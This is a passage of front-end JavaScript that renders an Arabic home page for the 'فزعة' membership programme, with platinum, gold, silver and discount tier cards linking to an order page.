    event.preventDefault();
  });

  page.appendChild(main);
  page.appendChild(createFooter());
  return page;
}

function createHomePage() {
  const page = document.createElement("div");
  page.className = "page";

  page.appendChild(
    createHeader({
      brand: "فزعة",
    }),
  );

  page.appendChild(createSlider());

  const productSection = document.createElement("section");
  productSection.className = "product-section";
  productSection.innerHTML = `
    <h2 class="product-section__title">مزاية العضوية</h2>
    <div class="product-grid">
      <details class="product-card">
        <summary class="product-card__summary">
          <img class="product-card__image" src="assets/images/products/Platinum.png" alt="" aria-hidden="true" />
          <div class="product-card__body">
            <div class="product-card__head">
              <h3 class="product-card__name product-card__name--platinum">البلاتينية</h3>
              <a class="product-card__button" href="order.html?tier=platinum">أطلب الان</a>
            </div>
            <div class="product-card__badge">الأكثر طلباً</div>
            <div class="product-card__feature-row" aria-hidden="true">
              <span class="product-card__feature-preview">أوسع مزايا وعروض حصرية.</span>
              <span class="product-card__feature-action">عرض المزيد</span>
            </div>
          </div>
        </summary>
        <div class="product-card__more">
          <ul class="product-card__list">
            <li>عروض البلاتينية الحصرية</li>
            <li>العروض والخصومات</li>
            <li>فنادق و باقات للسفر</li>
            <li>متاجر فزعه</li>
            <li>فزعه أماكن</li>
            <li>خدمة إيجار السيارات اليومي</li>
            <li>فزعه هيلث</li>
            <li>إيجار السيارات طويل الامد</li>
            <li>فزعه للسيارات المستعملة</li>
            <li>التعويض عن الحوادث الشخصية</li>
          </ul>
        </div>
      </details>
      <details class="product-card">
        <summary class="product-card__summary">
          <img class="product-card__image" src="assets/images/products/Gold.png" alt="" aria-hidden="true" />
          <div class="product-card__body">
            <div class="product-card__head">
              <h3 class="product-card__name product-card__name--gold">الذهبية</h3>
              <a class="product-card__button" href="order.html?tier=gold">أطلب الان</a>
            </div>
            <div class="product-card__feature-row" aria-hidden="true">
              <span class="product-card__feature-preview">عروض وخصومات مميزة.</span>
              <span class="product-card__feature-action">عرض المزيد</span>
            </div>
          </div>
        </summary>
        <div class="product-card__more">
          <ul class="product-card__list">
            <li>العروض والخصومات</li>
            <li>متاجر فزعه</li>
            <li>فزعه أماكن</li>
            <li>فنادق و باقات للسفر</li>
            <li>خدمة إيجار السيارات اليومي</li>
            <li>فزعه هيلث</li>
            <li>إيجار السيارات طويل الامد</li>
            <li>فزعه للسيارات المستعملة</li>
            <li>التعويض عن الحوادث الشخصية</li>
          </ul>
        </div>
      </details>
      <details class="product-card">
        <summary class="product-card__summary">
          <img class="product-card__image" src="assets/images/products/Silver.png" alt="" aria-hidden="true" />
          <div class="product-card__body">
            <div class="product-card__head">
              <h3 class="product-card__name product-card__name--silver">الفضية</h3>
              <a class="product-card__button" href="order.html?tier=silver">أطلب الان</a>
            </div>
            <div class="product-card__feature-row" aria-hidden="true">
              <span class="product-card__feature-preview">خصومات وخدمات أساسية.</span>
              <span class="product-card__feature-action">عرض المزيد</span>
            </div>
          </div>
        </summary>
        <div class="product-card__more">
          <ul class="product-card__list">
            <li>فزعه أماكن</li>
            <li>متاجر فزعه</li>
            <li>فزعه أماكن</li>
            <li>فنادق و باقات للسفر</li>
            <li>خدمة إيجار السيارات اليومي</li>
            <li>فزعه هيلث</li>
            <li>إيجار السيارات طويل الامد</li>
          </ul>
        </div>
      </details>
      <details class="product-card">
        <summary class="product-card__summary">
          <img class="product-card__image" src="assets/images/products/Discount.png" alt="" aria-hidden="true" />
          <div class="product-card__body">
            <div class="product-card__head">
              <h3 class="product-card__name product-card__name--discount">خصومات فزعه</h3>
              <a class="product-card__button" href="order.html?tier=fazaa">أطلب الان</a>
            </div>
            <div class="product-card__feature-row" aria-hidden="true">
              <span class="product-card__feature-preview">خصومات مختارة يومياً.</span>
              <span class="product-card__feature-action">عرض المزيد</span>
            </div>
          </div>
        </summary>
        <div class="product-card__more">
          <ul class="product-card__list">
            <li>فزعه هيلث</li>
            <li>متاجر فزعه</li>
            <li>فزعه أماكن</li>
            <li>فنادق و باقات للسفر</li>
            <li>خدمة إيجار السيارات اليومي</li>
            <li>فزعه هيلث</li>
          </ul>
        </div>
      </details>
    </div>
  `;

  page.appendChild(productSection);
  page.appendChild(createFooter());
  return page;
}

const isOrderPage = window.location.pathname.endsWith("order.html");
app.appendChild(isOrderPage ? createOrderPage() : createHomePage());
initializeLanguageToggle();
